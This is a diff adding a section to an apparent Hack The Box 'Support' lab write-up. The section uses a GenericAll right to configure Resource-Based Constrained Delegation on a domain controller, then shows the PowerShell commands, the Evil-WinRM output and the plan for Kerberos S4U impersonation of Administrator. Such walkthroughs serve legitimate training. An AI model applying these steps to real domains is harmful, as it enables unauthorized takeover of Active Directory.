@@ -1277,6 +1277,52 @@ DistinguishedName : CN=FAKE-COMP01,CN=Computers,DC=support,DC=htbName           
 
 ### 4.7 Configure Resource-Based Constrained Delegation
 
+With `GenericAll` over the DC and an attacker-controlled computer account in place, writing the DC's delegation attribute authorizes `FAKE-COMP01$` to impersonate any user when authenticating to the DC — the core of the RBCD attack.
+
+**Command:**
+
+```
+Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+```
+
+**Breakdown:**
+
+- `Set-ADComputer -Identity DC`
+    - **Description:** Modifies attributes of the DC computer object.
+    - **Purpose:** Writes to the DC — permitted only because `support` holds `GenericAll` over it.
+- `-PrincipalsAllowedToDelegateToAccount FAKE-COMP01$`
+    - **Description:** Friendly PowerShell wrapper for the `msDS-AllowedToActOnBehalfOfOtherIdentity` attribute.
+    - **Purpose:** Declares `FAKE-COMP01$` as a principal allowed to act on the DC's behalf, enabling S4U impersonation.
+
+**How RBCD leads to impersonation:** Resource-Based Constrained Delegation lets a resource (here, the DC) specify which accounts may request tickets _on behalf of other users_ to it. Once `FAKE-COMP01$` is listed, Kerberos S4U (Service-for-User) extensions allow the holder of `FAKE-COMP01$`'s credentials to obtain a service ticket to the DC that impersonates an arbitrary user — including a Domain Admin such as `Administrator`. Presenting that ticket yields access to the DC as that impersonated identity.
+
+**Result:**
+
+```shell
+*Evil-WinRM* PS C:\Users\support\Documents> Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount FAKE-COMP01$
+*Evil-WinRM* PS C:\Users\support\Documents> Get-ADComputer -Identity DC -Properties PrincipalsAllowedToDelegateToAccount
+
+
+DistinguishedName                    : CN=DC,OU=Domain Controllers,DC=support,DC=htb
+DNSHostName                          : dc.support.htb
+Enabled                              : True
+Name                                 : DC
+ObjectClass                          : computer
+ObjectGUID                           : afa13f1c-0399-4f7e-863f-e9c3b94c4127
+PrincipalsAllowedToDelegateToAccount : {CN=FAKE-COMP01,CN=Computers,DC=support,DC=htb}
+SamAccountName                       : DC$
+SID                                  : S-1-5-21-1677581083-3380853377-188903654-1000
+UserPrincipalName                    :
+
+
+
+*Evil-WinRM* PS C:\Users\support\Documents> 
+```
+
+_What this gives you:_ **Key finding:** the DC's `PrincipalsAllowedToDelegateToAccount` now contains `FAKE-COMP01`, so the attacker-controlled account can perform S4U impersonation against the Domain Controller.
+
+_Next:_ Derive `FAKE-COMP01$`'s Kerberos hash, then run a Rubeus S4U request to obtain a ticket impersonating `Administrator`.
 
 <div align="center">
 <br>
